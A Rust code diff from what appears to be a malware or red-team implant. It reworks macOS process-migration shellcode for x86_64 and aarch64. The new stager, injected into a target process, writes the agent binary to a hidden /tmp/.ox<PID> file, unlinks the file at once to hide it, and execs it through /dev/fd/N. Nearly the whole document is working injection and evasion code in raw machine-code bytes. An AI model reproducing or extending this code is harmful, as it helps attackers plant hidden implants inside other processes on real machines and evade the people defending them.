@@ -623,14 +623,22 @@ fn build_execve_stub(path: &std::path::Path) -> anyhow::Result<Vec<u8>> {
 #[cfg(target_os = "macos")]
 #[derive(Debug, Clone, Copy)]
 enum MacosMigrationStrategy {
-    MemfdExecve,
+    /// In-memory execution via anonymous temp file:
+    /// `open` + `write` + `unlink` + `/dev/fd/N` + `execve`.
+    /// The temp file is immediately unlinked so it vanishes from the
+    /// filesystem; the fd remains valid for execve via /dev/fd/N.
+    ShmExecve,
+    /// Execute the current on-disk agent binary path directly via execve.
     OnDiskExecve,
 }
 
 #[cfg(target_os = "macos")]
 fn detect_macos_migration_strategy() -> Result<MacosMigrationStrategy> {
-    // Prefer memfd on modern macOS, but keep a fallback that executes the
-    // current agent binary path directly when memfd is unavailable.
+    // macOS does not have memfd_create (that is a Linux-only API).
+    // Instead we use an anonymous temp-file approach: open a file, write the
+    // agent binary to it, unlink it immediately (so the directory entry is
+    // gone), then execve via /dev/fd/N.  The file content lives in the
+    // filesystem page cache / tmpfs and is cleaned up when the last fd closes.
     let version = std::process::Command::new("sw_vers")
         .args(["-productVersion"])
         .output()
@@ -646,11 +654,12 @@ fn detect_macos_migration_strategy() -> Result<MacosMigrationStrategy> {
         .ok_or_else(|| anyhow::anyhow!("unable to parse macOS version '{version}'"))?;
 
     if major >= 13 {
-        Ok(MacosMigrationStrategy::MemfdExecve)
+        Ok(MacosMigrationStrategy::ShmExecve)
     } else {
         tracing::warn!(
-                "macOS {version} does not provide memfd migration support; using on-disk execve fallback"
-            );
+            "macOS {version}: using on-disk execve fallback (anonymous temp-file migration \
+             requires macOS 13+)"
+        );
         Ok(MacosMigrationStrategy::OnDiskExecve)
     }
 }
@@ -770,7 +779,7 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
     let agent_path_bytes = agent_path.as_os_str().as_bytes().to_vec();
 
     let agent_binary = match strategy {
-        MacosMigrationStrategy::MemfdExecve => {
+        MacosMigrationStrategy::ShmExecve => {
             let bytes = std::fs::read(&agent_path).map_err(|e| {
                 anyhow::anyhow!("failed to read agent binary {}: {e}", agent_path.display())
             })?;
@@ -889,9 +898,9 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
 
             // 1. Build the selected exec stager.
             let (shellcode, verify_marker): (Vec<u8>, Option<String>) = match strategy {
-                MacosMigrationStrategy::MemfdExecve => {
+                MacosMigrationStrategy::ShmExecve => {
                     let agent_binary = agent_binary.as_ref().ok_or_else(|| {
-                        anyhow::anyhow!("missing agent binary for memfd migration")
+                        anyhow::anyhow!("missing agent binary for shm migration")
                     })?;
 
                     let mut binary_addr: mach_vm_address_t = 0;
@@ -918,7 +927,7 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
                     }
 
                     (
-                        build_macos_memfd_stub(binary_addr, agent_binary.len()),
+                        build_macos_shm_stub_x86_64(binary_addr, agent_binary.len()),
                         Some("/dev/fd/".to_string()),
                     )
                 }
@@ -1044,9 +1053,9 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
 
             // 1. Build the selected exec stager.
             let (shellcode, verify_marker): (Vec<u8>, Option<String>) = match strategy {
-                MacosMigrationStrategy::MemfdExecve => {
+                MacosMigrationStrategy::ShmExecve => {
                     let agent_binary = agent_binary.as_ref().ok_or_else(|| {
-                        anyhow::anyhow!("missing agent binary for memfd migration")
+                        anyhow::anyhow!("missing agent binary for shm migration")
                     })?;
 
                     let mut binary_addr: mach_vm_address_t = 0;
@@ -1073,7 +1082,7 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
                     }
 
                     (
-                        build_macos_memfd_stub(binary_addr, agent_binary.len()),
+                        build_macos_shm_stub_aarch64(binary_addr, agent_binary.len()),
                         Some("/dev/fd/".to_string()),
                     )
                 }
@@ -1167,26 +1176,44 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
     }
 }
 
-/// Build a position-independent shellcode stub that performs memfd-based
-/// process migration on macOS.
+/// Build a position-independent shellcode stub that performs anonymous
+/// temp-file process migration on macOS.
 ///
-/// The stub executes the following syscall sequence:
-///   1. memfd_create("", MFD_CLOEXEC)  → fd
-///   2. write(fd, binary_addr, binary_len)
-///   3. Build "/dev/fd/NNN" path on the stack via itoa
-///   4. execve("/dev/fd/NNN", NULL, NULL)
-///   5. exit(1) if execve fails
+/// macOS does NOT provide `memfd_create` (that is a Linux-only API).
+/// Instead the stub executes the following syscall sequence:
+///   1. getpid() → pid
+///   2. Build "/tmp/.ox<PID>" path on the stack via itoa
+///   3. open(path, O_RDWR|O_CREAT|O_TRUNC, 0700) → fd
+///   4. write(fd, binary_addr, binary_len)
+///   5. unlink(path) (immediately remove directory entry)
+///   6. Build "/dev/fd/N" path on the stack via itoa
+///   7. execve("/dev/fd/N", NULL, NULL)
+///   8. exit(1) if execve fails
+///
+/// The temp file is unlinked immediately after write, so it vanishes from
+/// the filesystem directory listing.  The fd remains valid for execve via
+/// the `/dev/fd/N` magic path.
 #[cfg(target_os = "macos")]
-fn build_macos_memfd_stub(binary_addr: u64, binary_len: usize) -> Vec<u8> {
+fn build_macos_shm_stub_x86_64(binary_addr: u64, binary_len: usize) -> Vec<u8> {
+    // Stub function that dispatches to the arch-specific builder.
     #[cfg(target_arch = "x86_64")]
     {
-        build_macos_memfd_stub_x86_64(binary_addr, binary_len)
+        build_macos_shm_stub_x86_64_impl(binary_addr, binary_len)
     }
+    #[cfg(not(target_arch = "x86_64"))]
+    {
+        let _ = (binary_addr, binary_len);
+        Vec::new()
+    }
+}
+
+#[cfg(target_os = "macos")]
+fn build_macos_shm_stub_aarch64(binary_addr: u64, binary_len: usize) -> Vec<u8> {
     #[cfg(target_arch = "aarch64")]
     {
-        build_macos_memfd_stub_aarch64(binary_addr, binary_len)
+        build_macos_shm_stub_aarch64_impl(binary_addr, binary_len)
     }
-    #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
+    #[cfg(not(target_arch = "aarch64"))]
     {
         let _ = (binary_addr, binary_len);
         Vec::new()
@@ -1277,28 +1304,80 @@ fn build_macos_execve_path_stub_aarch64(path_bytes: &[u8]) -> Result<Vec<u8>> {
     Ok(out)
 }
 
-/// macOS x86_64 memfd+execve shellcode.
+/// macOS x86_64 anonymous temp-file + execve shellcode.
 /// Uses BSD syscall ABI: syscall number in rax | 0x2000000.
+///
+/// Sequence:
+///   getpid → itoa → build "/tmp/.ox<PID>" → open → write → unlink →
+///   itoa fd → build "/dev/fd/N" → execve → exit(1)
 #[cfg(all(target_os = "macos", target_arch = "x86_64"))]
-fn build_macos_memfd_stub_x86_64(binary_addr: u64, binary_len: usize) -> Vec<u8> {
+fn build_macos_shm_stub_x86_64_impl(binary_addr: u64, binary_len: usize) -> Vec<u8> {
     let mut code = Vec::new();
 
-    // === Step 1: memfd_create("", MFD_CLOEXEC) ===
-    // push 0 (NUL terminator for empty string name)
-    code.extend_from_slice(&[0x6a, 0x00]);
-    // mov rdi, rsp (name = "")
-    code.extend_from_slice(&[0x48, 0x89, 0xe7]);
-    // mov esi, 1 (MFD_CLOEXEC)
-    code.extend_from_slice(&[0xbe, 0x01, 0x00, 0x00, 0x00]);
-    // mov rax, 0x2000000 + 518 (SYS_memfd_create)
+    // === Step 1: getpid() → pid in rax ===
+    // mov rax, 0x2000000 + 20 (SYS_getpid)
     code.extend_from_slice(&[0x48, 0xb8]);
-    code.extend_from_slice(&(0x2000000u64 + 518).to_le_bytes());
+    code.extend_from_slice(&(0x2000000u64 + 20).to_le_bytes());
+    // syscall
+    code.extend_from_slice(&[0x0f, 0x05]);
+
+    // === Step 2: Build "/tmp/.ox<PID>" path on stack ===
+    // sub rsp, 48 (path buffer, plenty of room)
+    code.extend_from_slice(&[0x48, 0x83, 0xec, 0x30]);
+    // lea r8, [rsp+47] (point to last byte of buffer)
+    code.extend_from_slice(&[0x4c, 0x8d, 0x44, 0x24, 0x2f]);
+    // mov byte [r8], 0 (NUL terminator)
+    code.extend_from_slice(&[0x41, 0xc6, 0x00, 0x00]);
+    // mov rcx, rax (pid for itoa)
+    code.extend_from_slice(&[0x48, 0x89, 0xc1]);
+
+    // itoa loop: convert pid to decimal digits right-to-left
+    let itoa_loop_start = code.len();
+    // dec r8
+    code.extend_from_slice(&[0x49, 0xff, 0xc8]);
+    // xor edx, edx
+    code.extend_from_slice(&[0x31, 0xd2]);
+    // mov r9d, 10
+    code.extend_from_slice(&[0x41, 0xb9, 0x0a, 0x00, 0x00, 0x00]);
+    // div r9 (rax = quotient, rdx = remainder)
+    code.extend_from_slice(&[0x49, 0xf7, 0xf1]);
+    // add dl, 0x30 ('0')
+    code.extend_from_slice(&[0x80, 0xc2, 0x30]);
+    // mov [r8], dl
+    code.extend_from_slice(&[0x41, 0x88, 0x10]);
+    // test rax, rax
+    code.extend_from_slice(&[0x48, 0x85, 0xc0]);
+    // jnz .itoa_loop (back to itoa_loop_start)
+    code.extend_from_slice(&[0x75, 0x00]); // placeholder for rel8
+    let rel8_idx = code.len() - 1;
+    let loop_size = (code.len() + 2 - itoa_loop_start) as u8;
+    code[rel8_idx] = loop_size.wrapping_neg();
+
+    // Prepend "/tmp/.ox" in reverse order (last char first): x o . / p m t /
+    for &ch in &[0x78, 0x6f, 0x2e, 0x2f, 0x70, 0x6d, 0x74, 0x2f] {
+        // dec r8
+        code.extend_from_slice(&[0x49, 0xff, 0xc8]);
+        // mov byte [r8], ch
+        code.extend_from_slice(&[0x41, 0xc6, 0x00, ch]);
+    }
+
+    // === Step 3: open(path, O_RDWR|O_CREAT|O_TRUNC, 0700) ===
+    // O_RDWR=2, O_CREAT=0x200, O_TRUNC=0x400 on macOS
+    // mov rdi, r8 (path)
+    code.extend_from_slice(&[0x4c, 0x89, 0xc7]);
+    // mov esi, 0x602 (O_RDWR|O_CREAT|O_TRUNC)
+    code.extend_from_slice(&[0xbe, 0x02, 0x06, 0x00, 0x00]);
+    // mov edx, 0x1c0 (0700 octal)
+    code.extend_from_slice(&[0xba, 0xc0, 0x01, 0x00, 0x00]);
+    // mov rax, 0x2000000 + 5 (SYS_open)
+    code.extend_from_slice(&[0x48, 0xb8]);
+    code.extend_from_slice(&(0x2000000u64 + 5).to_le_bytes());
     // syscall
     code.extend_from_slice(&[0x0f, 0x05]);
     // mov r12, rax (save fd)
     code.extend_from_slice(&[0x49, 0x89, 0xc4]);
 
-    // === Step 2: write(fd, binary_addr, binary_len) ===
+    // === Step 4: write(fd, binary_addr, binary_len) ===
     // mov rdi, r12 (fd)
     code.extend_from_slice(&[0x4c, 0x89, 0xe7]);
     // mov rsi, binary_addr
@@ -1313,7 +1392,16 @@ fn build_macos_memfd_stub_x86_64(binary_addr: u64, binary_len: usize) -> Vec<u8>
     // syscall
     code.extend_from_slice(&[0x0f, 0x05]);
 
-    // === Step 3: Build "/dev/fd/N" path on stack via itoa ===
+    // === Step 5: unlink(path) — remove directory entry ===
+    // mov rdi, r8 (path still points to "/tmp/.ox<PID>")
+    code.extend_from_slice(&[0x4c, 0x89, 0xc7]);
+    // mov rax, 0x2000000 + 10 (SYS_unlink)
+    code.extend_from_slice(&[0x48, 0xb8]);
+    code.extend_from_slice(&(0x2000000u64 + 10).to_le_bytes());
+    // syscall
+    code.extend_from_slice(&[0x0f, 0x05]);
+
+    // === Step 6: Build "/dev/fd/N" path on stack via itoa ===
     // sub rsp, 32 (path buffer)
     code.extend_from_slice(&[0x48, 0x83, 0xec, 0x20]);
     // lea r8, [rsp+31] (point to last byte)
@@ -1324,28 +1412,28 @@ fn build_macos_memfd_stub_x86_64(binary_addr: u64, binary_len: usize) -> Vec<u8>
     code.extend_from_slice(&[0x4c, 0x89, 0xe0]);
 
     // itoa loop: convert fd to decimal digits right-to-left
-    let itoa_loop_start = code.len();
+    let itoa2_loop_start = code.len();
     // dec r8
     code.extend_from_slice(&[0x49, 0xff, 0xc8]);
     // xor edx, edx
     code.extend_from_slice(&[0x31, 0xd2]);
-    // mov ecx, 10
-    code.extend_from_slice(&[0xb9, 0x0a, 0x00, 0x00, 0x00]);
-    // div rcx (rax = quotient, rdx = remainder)
-    code.extend_from_slice(&[0x48, 0xf7, 0xf1]);
+    // mov r9d, 10
+    code.extend_from_slice(&[0x41, 0xb9, 0x0a, 0x00, 0x00, 0x00]);
+    // div r9
+    code.extend_from_slice(&[0x49, 0xf7, 0xf1]);
     // add dl, 0x30 ('0')
     code.extend_from_slice(&[0x80, 0xc2, 0x30]);
     // mov [r8], dl
     code.extend_from_slice(&[0x41, 0x88, 0x10]);
     // test rax, rax
     code.extend_from_slice(&[0x48, 0x85, 0xc0]);
-    // jnz .itoa_loop (back to itoa_loop_start)
+    // jnz .itoa2_loop (back to itoa2_loop_start)
     code.extend_from_slice(&[0x75, 0x00]); // placeholder for rel8
-    let rel8_idx = code.len() - 1;
-    let loop_size = (code.len() + 2 - itoa_loop_start) as u8;
-    code[rel8_idx] = loop_size.wrapping_neg();
+    let rel8_idx2 = code.len() - 1;
+    let loop_size2 = (code.len() + 2 - itoa2_loop_start) as u8;
+    code[rel8_idx2] = loop_size2.wrapping_neg();
 
-    // Prepend "/dev/fd/" in reverse order (last char first)
+    // Prepend "/dev/fd/" in reverse order: / d f / v e d /
     for &ch in &[0x2f, 0x64, 0x66, 0x2f, 0x76, 0x65, 0x64, 0x2f] {
         // dec r8
         code.extend_from_slice(&[0x49, 0xff, 0xc8]);
@@ -1356,7 +1444,7 @@ fn build_macos_memfd_stub_x86_64(binary_addr: u64, binary_len: usize) -> Vec<u8>
     // mov rdi, r8 (path pointer for execve)
     code.extend_from_slice(&[0x4c, 0x89, 0xc7]);
 
-    // === Step 4: execve(path, NULL, NULL) ===
+    // === Step 7: execve(path, NULL, NULL) ===
     // xor esi, esi (argv=NULL)
     code.extend_from_slice(&[0x31, 0xf6]);
     // xor edx, edx (envp=NULL)
@@ -1367,7 +1455,7 @@ fn build_macos_memfd_stub_x86_64(binary_addr: u64, binary_len: usize) -> Vec<u8>
     // syscall
     code.extend_from_slice(&[0x0f, 0x05]);
 
-    // === Step 5: exit(1) fallback ===
+    // === Step 8: exit(1) fallback ===
     // mov edi, 1
     code.extend_from_slice(&[0xbf, 0x01, 0x00, 0x00, 0x00]);
     // mov rax, 0x2000000 + 1 (SYS_exit)
@@ -1379,53 +1467,32 @@ fn build_macos_memfd_stub_x86_64(binary_addr: u64, binary_len: usize) -> Vec<u8>
     code
 }
 
-/// macOS aarch64 memfd+execve shellcode.
+/// macOS aarch64 anonymous temp-file + execve shellcode.
 /// Uses BSD syscall ABI: syscall number in x16, invoke via `svc #0x80`.
+///
+/// Sequence:
+///   getpid → itoa → build "/tmp/.ox<PID>" → open → write → unlink →
+///   itoa fd → build "/dev/fd/N" → execve → exit(1)
 #[cfg(all(target_os = "macos", target_arch = "aarch64"))]
-fn build_macos_memfd_stub_aarch64(binary_addr: u64, binary_len: usize) -> Vec<u8> {
+fn build_macos_shm_stub_aarch64_impl(binary_addr: u64, binary_len: usize) -> Vec<u8> {
     let mut insts: Vec<u32> = Vec::new();
 
-    // === Step 1: memfd_create("", MFD_CLOEXEC) ===
-    // sub sp, sp, #16 (space for empty string)
-    insts.push(0xD10043FF);
-    // str xzr, [sp] (NUL-terminated empty string)
-    insts.push(0xF90003FF);
-    // mov x0, sp (add x0, sp, #0)
-    insts.push(0x910003E0);
-    // movz x1, #1 (MFD_CLOEXEC)
-    insts.push(0xD2800001);
-    // movz x16, #518 (SYS_memfd_create, macOS 13+)
-    insts.push(0xD28040D0);
-    // svc #0x80
-    insts.push(0xD4000001);
-    // mov x11, x0 (save fd)
-    insts.push(0xAA0003EB);
-
-    // === Step 2: write(fd, binary_addr, binary_len) ===
-    // mov x0, x11 (fd)
-    insts.push(0xAA0B03E0);
-    // mov x1, binary_addr
-    aarch64_load_64(&mut insts, 1, binary_addr);
-    // mov x2, binary_len
-    aarch64_load_64(&mut insts, 2, binary_len as u64);
-    // movz x16, #4 (SYS_write)
-    insts.push(0xD2800090);
+    // === Step 1: getpid() → pid in x0 ===
+    // movz x16, #20 (SYS_getpid)
+    insts.push(0xD2800290);
     // svc #0x80
     insts.push(0xD4000001);
 
-    // === Step 3: Build "/dev/fd/N" path on stack via itoa ===
-    // sub sp, sp, #32 (path buffer)
-    insts.push(0xD10083FF);
-    // add x12, sp, #31 (point to last byte of buffer)
-    insts.push(0x91007FEC);
+    // === Step 2: Build "/tmp/.ox<PID>" path on stack ===
+    // sub sp, sp, #64 (path buffer)
+    insts.push(0xD10103FF);
+    // add x12, sp, #63 (point to last byte of buffer)
+    insts.push(0x9100FDEC);
     // strb wzr, [x12] (NUL terminator)
     insts.push(0x3900019F);
-    // mov x0, x11 (fd for itoa)
-    insts.push(0xAA0B03E0);
-    // movz x13, #10 (divisor for decimal conversion)
-    insts.push(0xD280014D);
+    // mov x0, x0 (pid for itoa, already in x0 from getpid)
 
-    // itoa loop: convert fd to decimal digits right-to-left
+    // itoa loop: convert pid to decimal digits right-to-left
     let itoa_start = insts.len();
     // sub x12, x12, #1
     insts.push(0xD100058C);
@@ -1444,6 +1511,82 @@ fn build_macos_memfd_stub_aarch64(binary_addr: u64, binary_len: usize) -> Vec<u8
     let imm19 = (0x80000u32.wrapping_sub(back_offset)) & 0x7FFFF;
     insts.push(0xB5000000 | (imm19 << 5));
 
+    // Prepend "/tmp/.ox" in reverse order: x o . / p m t /
+    for &ch in &[0x78u8, 0x6f, 0x2e, 0x2f, 0x70, 0x6d, 0x74, 0x2f] {
+        // sub x12, x12, #1
+        insts.push(0xD100058C);
+        // movz w15, #ch
+        insts.push(0x52800000u32 | ((ch as u32) << 5) | 15);
+        // strb w15, [x12]
+        insts.push(0x3900018F);
+    }
+
+    // === Step 3: open(path, O_RDWR|O_CREAT|O_TRUNC, 0700) ===
+    // O_RDWR=2, O_CREAT=0x200, O_TRUNC=0x400 on macOS
+    // mov x0, x12 (path)
+    insts.push(0xAA0C03E0);
+    // movz x1, #0x602 (O_RDWR|O_CREAT|O_TRUNC)
+    insts.push(0xD280C041);
+    // movz x2, #0x1C0 (0700 octal)
+    insts.push(0xD2803822);
+    // movz x16, #5 (SYS_open)
+    insts.push(0xD28000B0);
+    // svc #0x80
+    insts.push(0xD4000001);
+    // mov x11, x0 (save fd)
+    insts.push(0xAA0003EB);
+
+    // === Step 4: write(fd, binary_addr, binary_len) ===
+    // mov x0, x11 (fd)
+    insts.push(0xAA0B03E0);
+    // mov x1, binary_addr
+    aarch64_load_64(&mut insts, 1, binary_addr);
+    // mov x2, binary_len
+    aarch64_load_64(&mut insts, 2, binary_len as u64);
+    // movz x16, #4 (SYS_write)
+    insts.push(0xD2800090);
+    // svc #0x80
+    insts.push(0xD4000001);
+
+    // === Step 5: unlink(path) — remove directory entry ===
+    // mov x0, x12 (path still points to "/tmp/.ox<PID>")
+    insts.push(0xAA0C03E0);
+    // movz x16, #10 (SYS_unlink)
+    insts.push(0xD2800150);
+    // svc #0x80
+    insts.push(0xD4000001);
+
+    // === Step 6: Build "/dev/fd/N" path on stack via itoa ===
+    // sub sp, sp, #32 (path buffer)
+    insts.push(0xD10083FF);
+    // add x12, sp, #31 (point to last byte of buffer)
+    insts.push(0x91007FEC);
+    // strb wzr, [x12] (NUL terminator)
+    insts.push(0x3900019F);
+    // mov x0, x11 (fd for itoa)
+    insts.push(0xAA0B03E0);
+    // movz x13, #10 (divisor for decimal conversion)
+    insts.push(0xD280014D);
+
+    // itoa loop: convert fd to decimal digits right-to-left
+    let itoa2_start = insts.len();
+    // sub x12, x12, #1
+    insts.push(0xD100058C);
+    // udiv x14, x0, x13 (quotient)
+    insts.push(0x9AC00800 | (13u32 << 16) | 14u32);
+    // msub x15, x14, x13, x0 (remainder = x0 - x14*x13)
+    insts.push(0x9B200000 | (13u32 << 16) | (14u32 << 5) | 15u32);
+    // add x15, x15, #0x30 (ASCII '0')
+    insts.push(0x9100C1EF);
+    // strb w15, [x12]
+    insts.push(0x3900018F);
+    // mov x0, x14 (quotient becomes next dividend)
+    insts.push(0xAA0E03E0);
+    // cbnz x0, itoa2_start
+    let back_offset2 = (insts.len() - itoa2_start) as u32;
+    let imm19_2 = (0x80000u32.wrapping_sub(back_offset2)) & 0x7FFFF;
+    insts.push(0xB5000000 | (imm19_2 << 5));
+
     // Prepend "/dev/fd/" in reverse order
     for &ch in &[0x2fu8, 0x64, 0x66, 0x2f, 0x76, 0x65, 0x64, 0x2f] {
         // sub x12, x12, #1
@@ -1457,7 +1600,7 @@ fn build_macos_memfd_stub_aarch64(binary_addr: u64, binary_len: usize) -> Vec<u8
     // mov x0, x12 (path pointer)
     insts.push(0xAA0C03E0);
 
-    // === Step 4: execve(path, NULL, NULL) ===
+    // === Step 7: execve(path, NULL, NULL) ===
     // movz x1, #0 (argv=NULL)
     insts.push(0xD2800001);
     // movz x2, #0 (envp=NULL)
@@ -1467,7 +1610,7 @@ fn build_macos_memfd_stub_aarch64(binary_addr: u64, binary_len: usize) -> Vec<u8
     // svc #0x80
     insts.push(0xD4000001);
 
-    // === Step 5: exit(1) fallback ===
+    // === Step 8: exit(1) fallback ===
     // movz x0, #1
     insts.push(0xD2800020);
     // movz x16, #1 (SYS_exit)
